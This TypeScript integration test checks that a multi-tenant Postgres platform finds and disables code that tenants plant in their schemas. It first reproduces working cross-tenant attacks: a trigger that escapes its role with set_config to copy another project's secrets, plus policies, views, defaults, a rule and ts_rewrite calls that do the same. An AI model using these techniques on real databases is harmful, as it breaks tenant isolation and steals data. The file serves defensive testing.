/**
 * CODE A PROJECT PLANTED IS SWITCHED OFF, AND THE PLATFORM NEVER RUNS IT AGAIN
 * ============================================================================
 *
 * Before read-write logins were held to rows on a shared database, one whose
 * admin allowed schema changes could act as its project's owner role and plant
 * code in its schema. The platform's role is a member of every project's owner
 * role, so a trigger planted on project A's table, fired when the platform
 * writes that table, read project B's rows. Making the platform's connection
 * assume A's owner role does not contain it: PostgreSQL checks SET ROLE against
 * the session user, so `set_config('role', 'none', false)` inside the trigger
 * returns to the platform's role. This suite does exactly that first, so the
 * fix is shown against a working attack rather than assumed.
 *
 * Then lib/security/planted-objects.ts (what scripts/neutralize-planted-objects.ts
 * runs) finds the planted trigger, rule and functions, and the policy, view and
 * default that call them, over a connection that logs in as a NOSUPERUSER
 * NOBYPASSRLS stand-in for the platform's role, and switches them off as it.
 * After that the platform's write runs none of it: the trigger and rule do not
 * fire, and the policy, view, default and a direct call fail with "permission
 * denied for function" instead of running the planted code.
 *
 * An expression that calls one of the platform's own functions, or a built-in
 * that runs SQL, needs no planted routine at all: a default calling
 * public.backenly_direct_sync_schema gave a project's login another project's
 * tables the moment the platform inserted a row. Those are found from the
 * catalog's stored trees and switched off too. So is a function a login gave
 * to the group every login joins, once the sync has taken it back from the
 * group: until then the platform's role cannot, and the run says so.
 *
 * Last, for a project with a record, the switch-off is one change on its
 * History, attributed to Backenly, that History refuses to restore, with an
 * audit entry naming what was switched off.
 *
 * Real Postgres: the property is what runs in whose session, which only the
 * database can say.
 */
import { randomBytes, randomUUID } from 'crypto'
import { Client } from 'pg'
import { prisma } from '@/lib/db/prisma'
import { createProvisionedProject } from '@/lib/projects/provision'
import { workspaceRawClient } from '@/lib/data-plane/regional'
import { previewRecovery } from '@/lib/changes/recovery'
import { planRestoreTo } from '@/lib/changes/range'
import { closeChangeLockPool } from '@/lib/changes/lock'
import { directAccessRoleNames } from '@/lib/services/direct-access'
import {
  PLANTED_CHANGE_GROUP,
  actionsFor,
  findPlanted,
  readDatabaseFacts,
  recordSwitchedOff,
  stillRunning,
  switchOff,
} from '@/lib/security/planted-objects'

jest.setTimeout(120_000)

const CONN = process.env.TEST_DATABASE_URL || process.env.DATABASE_URL || ''
const hex = randomBytes(6).toString('hex')
const PW = randomBytes(16).toString('hex')
const projectA = randomUUID()
const A = `workspace_${projectA}`
const B = `workspace_${randomUUID()}`
const ownA = `bkn_own_${randomBytes(6).toString('hex')}`
const ownB = `bkn_own_${randomBytes(6).toString('hex')}`
// Not bkn_-prefixed: the drift capture records DDL by bkn_ sessions, and this
// stands in for the platform's role, whose DDL it ignores.
const PLATFORM = `planted_app_${hex}`

const t = (schema: string, name: string) => `"${schema}".${name}`
/** A routine's signature as regprocedure writes it with pg_catalog alone on the search path. */
const sig = (name: string) => `"${A}".${name}()`

let admin: Client
/** A session logged in as the platform's stand-in: NOSUPERUSER, NOBYPASSRLS, a member of both owner roles. */
let platform: Client
const q = async (sql: string, params: unknown[] = []) => (await admin.query(sql, params)).rows

async function asRole(role: string, sql: string): Promise<void> {
  await admin.query('BEGIN')
  try {
    await admin.query(`SET LOCAL ROLE ${role}`)
    await admin.query(sql)
    await admin.query('COMMIT')
  } catch (err) {
    await admin.query('ROLLBACK').catch(() => {})
    throw err
  }
}

/**
 * The platform's statement as a per-project connection would run it, assuming
 * A's owner role first (the model a role switch alone would give), or, with
 * `assume: false`, as the platform runs it today: as its own role, which
 * inherits every project's owner role.
 */
async function platformWrites(sql: string, opts: { assume?: boolean } = {}): Promise<void> {
  if (opts.assume === false) {
    await platform.query(sql)
    return
  }
  await platform.query('BEGIN')
  try {
    await platform.query(`SET LOCAL ROLE ${ownA}`)
    await platform.query(sql)
    await platform.query('COMMIT')
  } catch (err) {
    await platform.query('ROLLBACK').catch(() => {})
    throw err
  } finally {
    // What the planted code may have done to the session's role, undone for the next statement.
    await platform.query('RESET ROLE').catch(() => {})
  }
}

const loot = async () => (await q(`SELECT value FROM ${t(A, 'loot')} ORDER BY 1`)).map((r) => r.value)
const ran = async () => q(`SELECT who, session FROM ${t(A, 'ran')}`)

beforeAll(async () => {
  admin = new Client({ connectionString: CONN })
  await admin.connect()

  // Two projects and the platform's stand-in, a member of both owner roles, as backenly_app is.
  await q(`CREATE ROLE ${ownA} NOLOGIN`)
  await q(`CREATE ROLE ${ownB} NOLOGIN`)
  await q(`CREATE ROLE ${PLATFORM} LOGIN PASSWORD '${PW}' NOSUPERUSER NOBYPASSRLS INHERIT`)
  await q(`GRANT ${ownA} TO ${PLATFORM}`)
  await q(`GRANT ${ownB} TO ${PLATFORM}`)
  await q(`CREATE SCHEMA "${A}" AUTHORIZATION ${ownA}`)
  await q(`CREATE SCHEMA "${B}" AUTHORIZATION ${ownB}`)

  // Project B's secret, which only B may read.
  await q(`CREATE TABLE ${t(B, 'secrets')} (id int PRIMARY KEY, value text)`)
  await q(`INSERT INTO ${t(B, 'secrets')} VALUES (1, 'tenant-B-only')`)
  await q(`ALTER TABLE ${t(B, 'secrets')} OWNER TO ${ownB}`)

  // Project A's tables.
  for (const ddl of [
    `CREATE TABLE ${t(A, 'orders')} (id int PRIMARY KEY, note text)`,
    `CREATE TABLE ${t(A, 'loot')} (value text)`,
    `CREATE TABLE ${t(A, 'ran')} (who text, session text)`,
    `CREATE TABLE ${t(A, 'notes')} (id int PRIMARY KEY, body text)`,
    `CREATE TABLE ${t(A, 'items')} (id int PRIMARY KEY, tag text)`,
    `CREATE TABLE ${t(A, 'marks')} (id int PRIMARY KEY)`,
  ]) await q(ddl)
  for (const table of ['orders', 'loot', 'ran', 'notes', 'items', 'marks']) await q(`ALTER TABLE ${t(A, table)} OWNER TO ${ownA}`)
  await q(`INSERT INTO ${t(A, 'orders')} VALUES (1, 'a')`)
  await q(`INSERT INTO ${t(A, 'notes')} VALUES (1, 'n')`)
  await q(`ALTER TABLE ${t(A, 'notes')} ENABLE ROW LEVEL SECURITY`)
  await q(`ALTER TABLE ${t(A, 'notes')} FORCE ROW LEVEL SECURITY`)
  await q(`ALTER TABLE ${t(A, 'marks')} ENABLE ROW LEVEL SECURITY`)

  // What project A planted, as its owner role, which its read-write login could act as.
  for (const ddl of [
    `CREATE FUNCTION ${t(A, 'steal')}() RETURNS trigger LANGUAGE plpgsql AS $$
     BEGIN
       PERFORM set_config('role', 'none', false);
       INSERT INTO ${t(A, 'ran')} VALUES (current_user, session_user);
       INSERT INTO ${t(A, 'loot')} SELECT value FROM ${t(B, 'secrets')};
       RETURN NEW;
     END $$`,
    `CREATE TRIGGER steal_trg BEFORE UPDATE ON ${t(A, 'orders')} FOR EACH ROW EXECUTE FUNCTION ${t(A, 'steal')}()`,
    `CREATE FUNCTION ${t(A, 'peek')}() RETURNS text LANGUAGE plpgsql AS $$
     BEGIN INSERT INTO ${t(A, 'loot')} SELECT value FROM ${t(B, 'secrets')}; RETURN 'peeked'; END $$`,
    `CREATE POLICY notes_read ON ${t(A, 'notes')} FOR SELECT USING (${t(A, 'peek')}() IS NOT NULL)`,
    `CREATE POLICY marks_mark ON ${t(A, 'marks')} FOR SELECT USING (length(set_config('bkn_test.planted', 'yes', true)) > 0)`,
    `CREATE VIEW ${t(A, 'peeking')} AS SELECT ${t(A, 'peek')}() AS p`,
    `ALTER TABLE ${t(A, 'items')} ALTER COLUMN tag SET DEFAULT ${t(A, 'peek')}()`,
    `CREATE RULE peek_on_insert AS ON INSERT TO ${t(A, 'orders')} DO ALSO SELECT ${t(A, 'peek')}()`,
  ]) await asRole(ownA, ddl)

  // What revoking a login does to what it owned: hands it to the platform's role.
  await q(`CREATE FUNCTION ${t(A, 'as_platform')}() RETURNS text LANGUAGE plpgsql SECURITY DEFINER AS $$
           BEGIN RETURN (SELECT string_agg(value, ',') FROM ${t(B, 'secrets')}); END $$`)
  await q(`ALTER FUNCTION ${t(A, 'as_platform')}() OWNER TO ${PLATFORM}`)

  const u = new URL(CONN)
  u.username = PLATFORM
  u.password = PW
  platform = new Client({ connectionString: u.toString() })
  await platform.connect()
})

afterAll(async () => {
  await platform?.end().catch(() => {})
  for (const s of [A, B]) await q(`DROP SCHEMA IF EXISTS "${s}" CASCADE`).catch(() => {})
  for (const role of [PLATFORM, ownA, ownB]) {
    await q(`DROP OWNED BY ${role}`).catch(() => {})
    await q(`DROP ROLE IF EXISTS ${role}`).catch(() => {})
  }
  await admin?.end()
})

describe('before: the planted code runs in the platform\'s session', () => {
  it('copies another project\'s rows when the platform writes the table, after leaving the role it assumed', async () => {
    await platformWrites(`UPDATE ${t(A, 'orders')} SET note = note WHERE id = 1`)
    expect(await loot()).toEqual(['tenant-B-only'])
    // SET ROLE NONE from inside the trigger returned it to the platform's own role.
    expect(await ran()).toEqual([{ who: PLATFORM, session: PLATFORM }])
    await q(`DELETE FROM ${t(A, 'loot')}`)
    await q(`DELETE FROM ${t(A, 'ran')}`)
  })

  it('copies them when the platform reads a table whose policy calls planted code', async () => {
    // As the platform reads today: its own role, which every project's owner role is granted to.
    await platformWrites(`SELECT * FROM ${t(A, 'notes')}`, { assume: false })
    expect(await loot()).toEqual(['tenant-B-only'])
    await q(`DELETE FROM ${t(A, 'loot')}`)
  })
})

describe('found, and switched off as the platform\'s role', () => {
  let facts: Awaited<ReturnType<typeof readDatabaseFacts>>
  let report: Awaited<ReturnType<typeof findPlanted>>

  it('finds what the project planted, and nothing of another project\'s', async () => {
    facts = await readDatabaseFacts(platform)
    expect(facts.platformRoles).toContain(PLATFORM)
    expect(facts.sharedRoles).toEqual(expect.arrayContaining(['public', PLATFORM]))
    report = await findPlanted(platform, [A, B], facts)

    const found = report.planted.map((p) => `${p.kind} ${p.signature ?? p.objectName}`).sort()
    expect(found).toEqual([
      `function ${sig('as_platform')}`,
      `function ${sig('peek')}`,
      `function ${sig('steal')}`,
      // set_config changes the session that reads the table: no privilege can take it back.
      'policy marks_mark',
      'rule peek_on_insert',
      'trigger steal_trg',
    ])
    expect(report.planted.every((p) => p.projectId === projectA)).toBe(true)
    expect(report.planted.find((p) => p.signature === sig('peek'))!.why).toMatch(/owner role/)
    expect(report.planted.find((p) => p.signature === sig('as_platform'))!.why).toMatch(/not a function Backenly installs/)

    // What calls them, and now fails closed instead.
    expect(report.callers.map((c) => `${c.type} ${c.calls}`).sort()).toEqual([
      `default value ${sig('peek')}`,
      `policy ${sig('peek')}`,
      `view ${sig('peek')}`,
    ])
    const policy = report.planted.find((p) => p.kind === 'policy')!
    expect(policy).toMatchObject({ name: 'marks_mark on marks', closesTable: true })
    expect(policy.calls!.join()).toMatch(/set_config\(text,text,boolean\)/)
    expect(report.review).toEqual([])
  })

  it('switches every one of them off, as the platform\'s role, and reads them back off', async () => {
    const live = [...new Set((await stillRunning(platform, report.planted, facts)).map((l) => l.object))]
    expect(live).toHaveLength(6)
    const actions = actionsFor(live)
    const result = await switchOff(projectA, actions, {
      execute: (sql) => platform.query(sql),
      governed: false,
      mainSchema: A,
    })
    expect(result.failed).toEqual([])
    expect(result.done.map((a) => a.does).sort()).toEqual([
      'EXECUTE taken from PUBLIC, ' + PLATFORM,
      'EXECUTE taken from PUBLIC, ' + ownA,
      'EXECUTE taken from PUBLIC, ' + ownA,
      'disabled',
      'disabled',
      'made SECURITY INVOKER',
      'made false, and its table held to Backenly\'s closed rule (service-role keys only)',
    ].sort())
    expect(await stillRunning(platform, report.planted, facts)).toEqual([])
    // The policy runs nothing now, and the table it was on is closed to all but service-role keys.
    expect(await q(
      `SELECT pol.polname::text AS name, pg_get_expr(pol.polqual, pol.polrelid) AS qual FROM pg_policy pol
        WHERE pol.polrelid = to_regclass($1) ORDER BY 1`,
      [t(A, 'marks')],
    )).toEqual([
      { name: 'backenly_admin_only', qual: expect.stringContaining("'service_role'") },
      { name: 'marks_mark', qual: 'false' },
    ])
    expect((await q(`SELECT relforcerowsecurity AS f FROM pg_class WHERE oid = to_regclass($1)`, [t(A, 'marks')]))[0].f).toBe(true)
    // Run again, it finds nothing left to do.
    expect(await stillRunning(platform, (await findPlanted(platform, [A, B], facts)).planted, facts)).toEqual([])
  })
})

describe('after: the platform runs none of it', () => {
  it('writes the table without firing the trigger, so SET ROLE NONE is never reached and nothing is copied', async () => {
    await platformWrites(`UPDATE ${t(A, 'orders')} SET note = 'written' WHERE id = 1`)
    await platformWrites(`UPDATE ${t(A, 'orders')} SET note = 'written' WHERE id = 1`, { assume: false })
    expect((await q(`SELECT note FROM ${t(A, 'orders')} WHERE id = 1`))[0].note).toBe('written')
    expect(await ran()).toEqual([])
    expect(await loot()).toEqual([])
  })

  it('inserts without the rule', async () => {
    await platformWrites(`INSERT INTO ${t(A, 'orders')} VALUES (2, 'b')`)
    expect(await loot()).toEqual([])
  })

  it('fails closed where a policy, a view, a default or a direct call reaches the planted function', async () => {
    for (const assume of [true, false]) {
      for (const sql of [
        `SELECT * FROM ${t(A, 'notes')}`,
        `SELECT * FROM ${t(A, 'peeking')}`,
        `INSERT INTO ${t(A, 'items')} (id) VALUES (1)`,
        `SELECT ${t(A, 'peek')}()`,
        `SELECT ${t(A, 'as_platform')}()`,
      ]) {
        await expect(platformWrites(sql, { assume })).rejects.toThrow(/permission denied for function/)
      }
    }
    expect(await loot()).toEqual([])
    const [definer] = await q(`SELECT prosecdef FROM pg_proc WHERE oid = to_regprocedure($1)`, [sig('as_platform')])
    expect(definer.prosecdef).toBe(false)
  })

  it('leaves the project\'s data where it was', async () => {
    expect(await q(`SELECT id, note FROM ${t(A, 'orders')} ORDER BY id`)).toEqual([{ id: 1, note: 'written' }, { id: 2, note: 'b' }])
    expect(await q(`SELECT id, value FROM ${t(B, 'secrets')}`)).toEqual([{ id: 1, value: 'tenant-B-only' }])
  })
})

describe('for a project with a record', () => {
  const originalEngineMode = process.env.ENGINE_MODE
  const originalEdition = process.env.BACKENLY_EDITION
  let ownerId = ''
  let projectId = ''
  let schema = ''
  let owner = ''

  beforeAll(async () => {
    // The change ledger records nothing in integration mode, and project
    // creation is refused on a single-tenant deployment, the default.
    process.env.ENGINE_MODE = 'runtime'
    process.env.BACKENLY_EDITION = 'cloud'
    ownerId = (await prisma.user.create({
      data: { email: `planted-${hex}@example.test`, password: 'not-a-real-hash', name: 'planted' },
      select: { id: true },
    })).id
    const project = await createProvisionedProject({ name: `planted-${hex}`, userId: ownerId })
    projectId = project.id
    schema = project.postgresSchema
    // What a project's login made as its owner role, as before the strip.
    owner = directAccessRoleNames(projectId).owner
    await q(`CREATE ROLE ${owner} NOLOGIN`)
    await q(`CREATE TABLE ${t(schema, 'orders')} (id int PRIMARY KEY, note text)`)
    await q(`CREATE FUNCTION ${t(schema, 'touch')}() RETURNS trigger LANGUAGE plpgsql AS $$ BEGIN RETURN NEW; END $$`)
    await q(`ALTER FUNCTION ${t(schema, 'touch')}() OWNER TO ${owner}`)
    await q(`CREATE TRIGGER touch_trg BEFORE UPDATE ON ${t(schema, 'orders')} FOR EACH ROW EXECUTE FUNCTION ${t(schema, 'touch')}()`)
  }, 120_000)

  afterAll(async () => {
    await closeChangeLockPool().catch(() => {})
    process.env.ENGINE_MODE = originalEngineMode
    if (originalEdition === undefined) delete process.env.BACKENLY_EDITION
    else process.env.BACKENLY_EDITION = originalEdition
    if (projectId) {
      await prisma.auditLog.deleteMany({ where: { projectId } }).catch(() => {})
      await prisma.project.deleteMany({ where: { id: projectId } }).catch(() => {})
    }
    if (ownerId) await prisma.user.deleteMany({ where: { id: ownerId } }).catch(() => {})
    if (schema) await q(`DROP SCHEMA IF EXISTS "${schema}" CASCADE`).catch(() => {})
    await q(`DROP OWNED BY ${owner}`).catch(() => {})
    await q(`DROP ROLE IF EXISTS ${owner}`).catch(() => {})
  }, 120_000)

  it('switches it off as one change attributed to Backenly, which History does not restore, and writes it down', async () => {
    const facts = await readDatabaseFacts(admin)
    const report = await findPlanted(admin, [schema], facts)
    expect(report.planted.map((p) => p.kind).sort()).toEqual(['function', 'trigger'])
    const live = await stillRunning(admin, report.planted, facts)
    const db = await workspaceRawClient(projectId)
    const result = await switchOff(projectId, actionsFor(live.map((l) => l.object)), {
      execute: (sql) => db.$executeRawUnsafe(sql),
      governed: true,
      mainSchema: schema,
    })
    expect(result.failed).toEqual([])
    await recordSwitchedOff(projectId, report, result)

    const [trigger] = await q(`SELECT tgenabled FROM pg_trigger WHERE tgname = 'touch_trg' AND tgrelid = to_regclass($1)`, [t(schema, 'orders')])
    expect(trigger.tgenabled).toBe('D')

    expect(result.changeSeq).not.toBeNull()
    const change = await prisma.backendChange.findFirst({ where: { projectId, seq: result.changeSeq! } })
    expect(change).toMatchObject({ source: 'system', groupId: PLANTED_CHANGE_GROUP })
    expect(await previewRecovery(projectId, change!.id)).toMatchObject({ safety: 'unavailable', unavailableCode: 'NOT_RESTORABLE' })
    expect((await planRestoreTo(projectId, 0)).stop).toMatchObject({ seq: change!.seq, code: 'UNAVAILABLE' })

    const audit = await prisma.auditLog.findFirst({ where: { projectId, action: 'PLANTED_OBJECTS_SWITCHED_OFF' } })
    expect(audit?.type).toBe('security')
    const details = JSON.parse(audit!.details!)
    expect(details.switchedOff.map((s: { kind: string }) => s.kind).sort()).toEqual(['function', 'trigger'])
    expect(details.changeSeq).toBe(result.changeSeq)
  })
})

describe('an expression that calls one of the platform\'s functions, or a built-in that runs SQL', () => {
  // Two more projects, as the platform makes them: owner roles it is a member
  // of, and project A2's read-write login, made and synced by the helpers.
  const h = randomBytes(6).toString('hex')
  const A2 = `workspace_${randomUUID()}`
  const B2 = `workspace_${randomUUID()}`
  const ownA2 = `bkn_own_${h}`
  const rwA2 = `bkn_rw_${h}`
  const ownB2 = `bkn_own_${randomBytes(6).toString('hex')}`
  const LOGIN_PW = randomBytes(24).toString('base64url')
  let found: Awaited<ReturnType<typeof findPlanted>>
  let facts: Awaited<ReturnType<typeof readDatabaseFacts>>

  async function asLogin<T>(fn: (c: Client) => Promise<T>): Promise<T> {
    const u = new URL(CONN)
    u.username = rwA2
    u.password = LOGIN_PW
    const c = new Client({ connectionString: u.toString() })
    c.on('error', () => {})
    await c.connect()
    try {
      return await fn(c)
    } finally {
      await c.end().catch(() => {})
    }
  }
  const loginReadsB = () =>
    asLogin((c) => c.query(`SELECT value FROM ${t(B2, 'secrets')}`).then((r) => r.rows.map((x) => x.value), (e) => (e as Error).message))

  beforeAll(async () => {
    for (const role of [ownA2, ownB2]) {
      await q(`CREATE ROLE ${role} NOLOGIN`)
      await q(`GRANT ${role} TO ${PLATFORM}`)
    }
    await q(`CREATE SCHEMA "${B2}" AUTHORIZATION ${ownB2}`)
    await q(`CREATE TABLE ${t(B2, 'secrets')} (id int PRIMARY KEY, value text)`)
    await q(`INSERT INTO ${t(B2, 'secrets')} VALUES (1, 'tenant-B-only')`)
    await q(`ALTER TABLE ${t(B2, 'secrets')} OWNER TO ${ownB2}`)
    await q(`CREATE SCHEMA "${A2}" AUTHORIZATION ${ownA2}`)
    for (const ddl of [
      `CREATE TABLE ${t(A2, 'items')} (id int PRIMARY KEY, tag text)`,
      `CREATE TABLE ${t(A2, 'notes')} (id int PRIMARY KEY, body text)`,
      `CREATE TABLE ${t(A2, 'shown')} (id int PRIMARY KEY)`,
    ]) await asRole(ownA2, ddl)
    await q(`ALTER TABLE ${t(A2, 'shown')} ENABLE ROW LEVEL SECURITY`)
    await q(`SELECT public.backenly_direct_create_role($1, $2, $3, 'READ_WRITE')`, [rwA2, LOGIN_PW, A2])
    await q(`SELECT public.backenly_direct_sync_schema($1, NULL, $2, $3)`, [A2, rwA2, ownA2])
    // As the application's role holds it.
    await q(`GRANT EXECUTE ON FUNCTION public.backenly_direct_sync_schema(text, text, text, text) TO ${PLATFORM}`)

    // Planted as A2's owner role, which its login could act as before the strip.
    await asRole(ownA2, `ALTER TABLE ${t(A2, 'items')} ALTER COLUMN tag SET DEFAULT
      (public.backenly_direct_sync_schema('${B2}', NULL, '${rwA2}', NULL))::text`)
    await asRole(ownA2, `ALTER TABLE ${t(A2, 'notes')} ALTER COLUMN body SET DEFAULT
      (ts_rewrite('x'::tsquery, 'SELECT ''x''::tsquery, plainto_tsquery(''simple'', value) FROM "${B2}".secrets'))::text`)
    await asRole(ownA2, `CREATE POLICY shown_read ON ${t(A2, 'shown')} FOR SELECT USING (public.backenly_direct_shared_database())`)
    // A view of another project's table: made by a superuser, since A2's owner
    // role cannot see into B2, then handed to it.
    await q(`CREATE VIEW ${t(A2, 'peek_b')} AS SELECT id, value FROM ${t(B2, 'secrets')}`)
    await q(`ALTER VIEW ${t(A2, 'peek_b')} OWNER TO ${ownA2}`)
  }, 120_000)

  afterAll(async () => {
    for (const s of [A2, B2]) await q(`DROP SCHEMA IF EXISTS "${s}" CASCADE`).catch(() => {})
    await q(`SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE usename = $1`, [rwA2]).catch(() => {})
    for (const role of [rwA2, ownA2, ownB2]) {
      await q(`DROP OWNED BY ${role}`).catch(() => {})
      await q(`DROP ROLE IF EXISTS ${role}`).catch(() => {})
    }
  }, 120_000)

  it('before: the platform inserting a row of A2 gives A2\'s login B2\'s tables, and copies B2\'s rows into A2', async () => {
    expect(await loginReadsB()).toMatch(/permission denied/)
    await platform.query(`INSERT INTO ${t(A2, 'items')} (id) VALUES (1)`)
    expect(await loginReadsB()).toEqual(['tenant-B-only'])
    await platform.query(`INSERT INTO ${t(A2, 'notes')} (id) VALUES (1)`)
    expect((await q(`SELECT body FROM ${t(A2, 'notes')} WHERE id = 1`))[0].body).toMatch(/tenant/)
    // Put back, so what follows starts from a login that cannot read B2.
    await q(`REVOKE ALL ON ALL TABLES IN SCHEMA "${B2}" FROM ${rwA2}`)
    await q(`REVOKE ALL ON SCHEMA "${B2}" FROM ${rwA2}`)
    await q(`DELETE FROM ${t(A2, 'items')}`)
    await q(`DELETE FROM ${t(A2, 'notes')}`)
    expect(await loginReadsB()).toMatch(/permission denied/)
  }, 60_000)

  it('finds each expression, with what it calls or reads, and switches it off as the platform\'s role', async () => {
    facts = await readDatabaseFacts(platform)
    found = await findPlanted(platform, [A2, B2], facts)
    const byName = Object.fromEntries(found.planted.map((p) => [`${p.kind} ${p.name}`, p]))
    expect(Object.keys(byName).sort()).toEqual(['default items.tag', 'default notes.body', 'policy shown_read on shown', 'view peek_b'])
    expect(byName['default items.tag'].calls).toEqual(['public.backenly_direct_sync_schema(text,text,text,text)'])
    expect(byName['default notes.body'].calls!.join()).toMatch(/ts_rewrite\(tsquery,text\)/)
    expect(byName['policy shown_read on shown']).toMatchObject({ calls: ['public.backenly_direct_shared_database()'], closesTable: true })
    expect(byName['view peek_b'].reads).toEqual([`"${B2}".secrets`])
    expect(found.planted.every((p) => p.projectId === A2.slice(10))).toBe(true)

    const live = [...new Set((await stillRunning(platform, found.planted, facts)).map((l) => l.object))]
    expect(live).toHaveLength(4)
    const result = await switchOff(A2.slice(10), actionsFor(live), {
      execute: (sql) => platform.query(sql),
      governed: false,
      mainSchema: A2,
    })
    expect(result.failed).toEqual([])
    expect(await stillRunning(platform, found.planted, facts)).toEqual([])
    expect((await findPlanted(platform, [A2, B2], facts)).planted).toEqual([])
  }, 60_000)

  it('after: the platform inserting rows of A2 runs none of it, and A2\'s login still cannot read B2', async () => {
    await platform.query(`INSERT INTO ${t(A2, 'items')} (id) VALUES (2)`)
    await platform.query(`INSERT INTO ${t(A2, 'notes')} (id) VALUES (2)`)
    expect(await loginReadsB()).toMatch(/permission denied/)
    expect(await q(`SELECT tag FROM ${t(A2, 'items')}`)).toEqual([{ tag: null }])
    expect(await q(`SELECT body FROM ${t(A2, 'notes')}`)).toEqual([{ body: null }])
    // The view keeps its columns for whatever reads it, and returns nothing.
    expect(await q(`SELECT * FROM ${t(A2, 'peek_b')}`)).toEqual([])
    expect(await q(
      `SELECT attname::text AS name, format_type(atttypid, atttypmod) AS type FROM pg_attribute
        WHERE attrelid = to_regclass($1) AND attnum > 0 ORDER BY attnum`,
      [t(A2, 'peek_b')],
    )).toEqual([{ name: 'id', type: 'integer' }, { name: 'value', type: 'text' }])
    // The policy's table is held to Backenly's closed rule.
    expect((await q(`SELECT relforcerowsecurity AS f FROM pg_class WHERE oid = to_regclass($1)`, [t(A2, 'shown')]))[0].f).toBe(true)
    expect((await q(`SELECT count(*)::int AS n FROM pg_policy WHERE polrelid = to_regclass($1) AND polname = 'backenly_admin_only'`,
      [t(A2, 'shown')]))[0].n).toBe(1)
    // Its data is where it was.
    expect(await q(`SELECT value FROM ${t(B2, 'secrets')}`)).toEqual([{ value: 'tenant-B-only' }])
  }, 60_000)
})

describe('a function a login gave to the group every login joins', () => {
  const h = randomBytes(6).toString('hex')
  const S = `workspace_${randomUUID()}`
  const ownS = `bkn_own_${h}`
  const L = `bkn_rw_${h}`
  const LOGIN_PW = randomBytes(24).toString('base64url')
  const persist = `"${S}".persist()`
  let before: Array<{ object: { name: string }; what: string }> = []
  let beforeLeft: Array<{ object: { name: string }; what: string }> = []

  async function asL<T>(fn: (c: Client) => Promise<T>): Promise<T> {
    const u = new URL(CONN)
    u.username = L
    u.password = LOGIN_PW
    const c = new Client({ connectionString: u.toString() })
    c.on('error', () => {})
    await c.connect()
    try {
      return await fn(c)
    } finally {
      await c.end().catch(() => {})
    }
  }
  const run = (c: Client, sql: string) => c.query(sql).then(() => 'ok', (e) => (e as Error).message)

  beforeAll(async () => {
    await q(`CREATE ROLE ${ownS} NOLOGIN`)
    await q(`GRANT ${ownS} TO ${PLATFORM}`)
    await q(`CREATE SCHEMA "${S}" AUTHORIZATION ${ownS}`)
    for (const ddl of [`CREATE TABLE ${t(S, 'notes')} (id int PRIMARY KEY, body text)`, `CREATE TABLE ${t(S, 'loot')} (value text)`]) {
      await asRole(ownS, ddl)
    }
    await q(`INSERT INTO ${t(S, 'notes')} VALUES (1, 'n')`)
    await q(`ALTER TABLE ${t(S, 'notes')} ENABLE ROW LEVEL SECURITY`)
    await q(`ALTER TABLE ${t(S, 'notes')} FORCE ROW LEVEL SECURITY`)
    // A read-write login as the helpers made one before: joined to the group
    // with SET, a member of its owner role, CREATE on its schema.
    await q(`CREATE ROLE ${L} LOGIN PASSWORD '${LOGIN_PW}' IN ROLE backenly_external`)
    await q(`GRANT ${ownS} TO ${L}`)
    await q(`GRANT USAGE, CREATE ON SCHEMA "${S}" TO ${L}`)
    // What it does with that, logged in as itself.
    const done = await asL(async (c) => [
      await run(c, `GRANT CREATE ON SCHEMA "${S}" TO backenly_external`),
      await run(c, `CREATE FUNCTION ${persist.replace('()', '')}() RETURNS text LANGUAGE plpgsql AS $$
                      BEGIN INSERT INTO ${t(S, 'loot')} SELECT value FROM ${t(B, 'secrets')}; RETURN 'x'; END $$`),
      await run(c, `ALTER FUNCTION ${persist} OWNER TO backenly_external`),
      await run(c, `REVOKE CREATE ON SCHEMA "${S}" FROM backenly_external`),
      await run(c, `CREATE POLICY notes_read ON ${t(S, 'notes')} FOR SELECT USING (${persist} IS NOT NULL)`),
    ])
    expect(done).toEqual(['ok', 'ok', 'ok', 'ok', 'ok'])
  }, 120_000)

  afterAll(async () => {
    await q(`DROP SCHEMA IF EXISTS "${S}" CASCADE`).catch(() => {})
    await q(`SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE usename = $1`, [L]).catch(() => {})
    for (const role of [L, ownS]) {
      await q(`DROP OWNED BY ${role}`).catch(() => {})
      await q(`DROP ROLE IF EXISTS ${role}`).catch(() => {})
    }
  }, 120_000)

  it('cannot be switched off by the platform\'s role while the group owns it, and the run says so rather than claim it did', async () => {
    const facts = await readDatabaseFacts(platform)
    const report = await findPlanted(platform, [S], facts)
    expect(report.planted.map((p) => `${p.kind} ${p.name}`)).toEqual([`function ${persist}`])
    before = await stillRunning(platform, report.planted, facts)
    expect(before.map((l) => l.what).join('\n')).toMatch(/owned by backenly_external, which a direct-access login acts as/)
    await switchOff(S.slice(10), actionsFor(report.planted), { execute: (sql) => platform.query(sql), governed: false, mainSchema: S })
    beforeLeft = await stillRunning(platform, report.planted, facts)
    expect(beforeLeft.length).toBeGreaterThan(0)
  }, 60_000)

  it('is the owner role\'s once the sync strips the login, and is then switched off for good', async () => {
    await q(`SELECT public.backenly_direct_sync_schema($1, NULL, $2, $3)`, [S, L, ownS])
    expect((await q(`SELECT pg_get_userbyid(proowner)::text AS o FROM pg_proc WHERE oid = to_regprocedure($1)`, [persist]))[0].o).toBe(ownS)
    expect(await q(`SELECT public.backenly_direct_schema_change_holds($1) AS h`, [L])).toEqual([{ h: [] }])

    const facts = await readDatabaseFacts(platform)
    const report = await findPlanted(platform, [S], facts)
    const live = [...new Set((await stillRunning(platform, report.planted, facts)).map((l) => l.object))]
    const result = await switchOff(S.slice(10), actionsFor(live), { execute: (sql) => platform.query(sql), governed: false, mainSchema: S })
    expect(result.failed).toEqual([])
    expect(await stillRunning(platform, report.planted, facts)).toEqual([])

    // The platform reading the table fails closed, and copies nothing.
    await expect(platform.query(`SELECT * FROM ${t(S, 'notes')}`)).rejects.toThrow(/permission denied for function/)
    expect(await q(`SELECT value FROM ${t(S, 'loot')}`)).toEqual([])
    // The login can neither switch it back on nor become the group.
    const tried = await asL(async (c) => [
      await run(c, `GRANT EXECUTE ON FUNCTION ${persist} TO PUBLIC`),
      await run(c, `SET ROLE backenly_external`),
    ])
    expect(tried[0]).toMatch(/permission denied/)
    expect(tried[1]).toMatch(/permission denied to set role/)
    expect((await q(`SELECT has_function_privilege('public', to_regprocedure($1), 'EXECUTE') AS e`, [persist]))[0].e).toBe(false)
  }, 60_000)
})
